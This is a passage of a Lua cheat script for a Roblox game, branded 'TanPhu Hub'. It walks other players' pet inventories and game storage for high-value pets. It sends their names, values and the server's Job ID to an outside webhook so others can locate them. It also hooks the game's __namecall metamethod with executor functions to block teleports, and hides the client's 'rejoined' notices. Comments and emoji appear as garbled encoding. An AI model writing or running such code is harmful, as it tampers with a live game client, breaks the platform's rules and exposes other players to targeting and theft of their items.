  for _,t in ipairs(toks) do if s:find(t, 1, true) then return true end end
  return false
end

local function TP_text_is_per_sec(txt)
  local s = tostring(txt or ""):lower()
  return (s:find("/s", 1, true) ~= nil) or s:find("per%s*sec") or s:find("per%s*second")
end

local function TP_collect_prices(container)
  local list = {}
  if not (container and container.GetDescendants) then return list end
  local ok, descs = pcall(container.GetDescendants, container)
  if not ok or type(descs) ~= "table" then return list end

  for i = 1, #descs do
    local d = descs[i]
    local nm_l = tostring(d.Name or ""):lower()
    if not TP_has_token(nm_l, TP_DENY) then
      if d:IsA("TextLabel") or d:IsA("TextButton") then
        local t = tostring(d.Text or "")
        if t ~= "" and TP_text_is_per_sec(t) and not TP_has_token(t, TP_DENY) then
          local n = TP_parse_mps(t); if n > 0 then list[#list+1] = n end
        end
      elseif d:IsA("StringValue") then
        local v = d.Value
        if type(v) == "string" and TP_text_is_per_sec(v) and not TP_has_token(v, TP_DENY) then
          local n = TP_parse_mps(v); if n > 0 then list[#list+1] = n end
        end
      elseif d:IsA("NumberValue") or d:IsA("IntValue") then
        if TP_has_token(nm_l, TP_ALLOW) then
          local n = tonumber(d.Value) or 0
          if n > 0 then list[#list+1] = n end
        end
      end
    end
  end

  for _,k in ipairs({"MoneyPerSec","MoneyPerSecond","MPS"}) do
    local a = container:GetAttribute(k)
    if a ~= nil then
      if typeof(a) == "number" and a > 0 then
        list[#list+1] = a
      elseif typeof(a) == "string" and TP_text_is_per_sec(a) then
        local n = TP_parse_mps(a); if n > 0 then list[#list+1] = n end
      end
    end
  end
  return list
end

local function TP_find_rule(name)
  local nm = tostring(name or ""):lower()
  for _,r in ipairs(TP_RULES) do
    local k = tostring(r.k or ""):lower()
    if k ~= "" and nm:find(k, 1, true) then return r end
  end
  return nil
end

local function TP_filter_prices(prices, rule, nameKey, sent_keys)
  local uniq, out = {}, {}
  for i=1,#prices do
    local p = prices[i]
    local okMin = (not rule.min) or (p >= rule.min)
    local okMax = (not rule.max) or (p <= rule.max)
    if okMin and okMax then
      local key = (nameKey or "") .. ":" .. tostring(p)
      if not uniq[p] and not (sent_keys and sent_keys[key]) then
        uniq[p] = true
        out[#out+1] = p
      end
    end
  end
  table.sort(out)
  return out
end

local function TP_send_card(petName, prices_sorted)
  if not prices_sorted or #prices_sorted == 0 then return false end
  local jobB64 = TP_b64(tostring(game.JobId))
  local lines = {}
  for i=1,#prices_sorted do lines[i] = TP_fmt(prices_sorted[i]) end
  local listBlock = "```\n" .. table.concat(lines, "\n") .. "\n```"

  local payload = {
    username = "Brainrot Notify | TanPhu Hub",
    embeds = {{
      title = "Brainrot Notify | TanPhu Hub",
      color = 0x00AAFF,
      fields = {
        { name = "üè∑Ô∏è Name",          value = tostring(petName),                    inline = true },
        { name = "üí∞ Money per sec", value = TP_fmt(prices_sorted[1]).." (min)",   inline = true },
        { name = "üë• Players",        value = ("%d/%d"):format(#Players:GetPlayers(), Players.MaxPlayers or 0), inline = true },
        { name = "Job ID (Mobile)",  value = "```"..jobB64.."```", inline = false },
        { name = "Job ID (iOS)",     value = "```"..jobB64.."```", inline = false },
        { name = "Job ID (PC)",      value = "```"..jobB64.."```", inline = false },
        { name = "Prices (low‚Üíhigh)", value = listBlock, inline = false },
      },
      footer = { text = "Made by TanPhu Hub" },
      timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }}
  }
  return TP_http_post(TP_WEBHOOK_URL, payload)
end

local function TP_gather_containers()
  local conts = {}
  local function add(x) if x then conts[#conts+1] = x end end

  for _, plr in ipairs(Players:GetPlayers()) do
    for _, nm in ipairs({"Pets","Inventory","PetInventory","Bag","Backpack"}) do
      add(plr:FindFirstChild(nm))
    end
    if plr == LocalPlayer then add(plr:FindFirstChild("PlayerGui")) end
  end

  local RS = game:FindFirstChild("ReplicatedStorage"); add(RS)
  if RS then
    local ok, descs = pcall(RS.GetDescendants, RS)
    if ok and type(descs)=="table" then
      for i=1,#descs do
        local d = descs[i]
        if d:IsA("Folder") or d:IsA("ModuleScript") then
          local n = tostring(d.Name or ""):lower()
          if n:find("pet") or n:find("brainrot") then add(d) end
        end
      end
    end
  end

  add(game:GetService("Workspace"))
  return conts
end

local function TP_scan_and_send()
  if TP_ONE_SHOT and TP_reported_once then return end
  local sent = 0
  local nameKeys = {}
  for _,r in ipairs(TP_RULES) do
    local k = tostring(r.k or ""):lower()
    if k ~= "" then nameKeys[k] = true end
  end

  local containers = TP_gather_containers()
  for i=1,#containers do
    local c = containers[i]
    local okDescs, descs = pcall(function()
      return (c and c.GetDescendants) and c:GetDescendants() or {}
    end)
    if okDescs and type(descs)=="table" then
      for j=1,#descs do
        local inst = descs[j]
        local nm = tostring(inst.Name or ""):lower()

        local matched = nil
        for key,_ in pairs(nameKeys) do if nm:find(key, 1, true) then matched = key break end end
        if matched then
          local rule = TP_find_rule(inst.Name)
          if rule then
            local prices = {}
            local function add_all(from)
              if not from then return end
              local ok, t = pcall(TP_collect_prices, from)
              if ok and type(t)=="table" then for k=1,#t do prices[#prices+1] = t[k] end end
            end
            add_all(inst); add_all(inst.Parent); add_all(inst.Parent and inst.Parent.Parent)
            local good = TP_filter_prices(prices, rule, nm, TP_sent_global)
            if #good > 0 then
              if TP_send_card(inst.Name, good) then
                local base = nm
                for k=1,#good do TP_sent_global[base..":"..tostring(good[k])] = true end
                sent = sent + 1
                if sent >= TP_MAX_CARDS_PER_SERVER then break end
              end
            end
          end
        end
      end
    end
    if sent >= TP_MAX_CARDS_PER_SERVER then break end
  end

  if sent > 0 and TP_ONE_SHOT then TP_reported_once = true end
end

task.spawn(function()
  task.wait(TP_FIRST_DELAY)
  while true do
    pcall(TP_scan_and_send)
    task.wait(TP_SCAN_INTERVAL)
  end
end)

--======================================================
-- Anti Auto-Rejoin/Hop v2 (no bypass needed; Join Job ID never blocked)
--======================================================
do
    local TeleportService = game:GetService("TeleportService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    local ORIG_PLACE = game.PlaceId

    -- Toggle UI
    local antiRejoinEnabled = true
    local antiRejoinToggle = createToggle(contentTabs["Helper"], "Anti Auto-Rejoin",
        "Block Teleport/TeleportAsync to same place (Join Job ID allowed)", 6)
    antiRejoinToggle.SetCallback(function(state)
        antiRejoinEnabled = state
    end)

    -- Rule: block random rejoin/hop; allow TeleportToPlaceInstance
    local function _shouldBlock(method, args)
        if not antiRejoinEnabled then return false end
        local destPlace = tonumber(args[1])
        if method == "Teleport" or method == "TeleportAsync" or method == "TeleportPartyAsync" then
            if destPlace == ORIG_PLACE then
                return true  -- game t·ª± rejoin/hop ng·∫´u nhi√™n -> ch·∫∑n
            end
        end
        -- TeleportToPlaceInstance (ƒë√≠ch c·ª• th·ªÉ) -> lu√¥n cho ph√©p (Join Job ID / webhook)
        return false
    end

    -- Hook __namecall
    local mt = getrawmetatable and getrawmetatable(game)
    if mt then
        local canWrite = (setreadonly ~= nil)
        local oldNamecall = mt.__namecall
        if canWrite then pcall(setreadonly, mt, false) end
        mt.__namecall = (newcclosure or function(f) return f end)(function(self, ...)
            local method = (getnamecallmethod and getnamecallmethod()) or ""
            local args = {...}
            if self == TeleportService and _shouldBlock(method, args) then
                return -- block auto rejoin/hop
            end
            return oldNamecall(self, ...)
        end)
        if canWrite then pcall(setreadonly, mt, true) end
    end

    -- ·∫®n banner ‚Äúrejoined due to ‚Ä¶‚Äù
    task.spawn(function()
        local CoreGui = game:GetService("CoreGui")
        while true do
            task.wait(0.3)
            pcall(function()
                for _,ui in ipairs(CoreGui:GetDescendants()) do
                    if ui:IsA("TextLabel") or ui:IsA("TextButton") then
                        local t = tostring(ui.Text):lower()
                        if t:find("you have been rejoined") or t:find("rejoined due to") then
                            ui.Text = ""
                        end
                    end
                end
            end)
        end
    end)
end

----------------------------------------------------------------------------------------------------
--                                         ADD-ON END
----------------------------------------------------------------------------------------------------
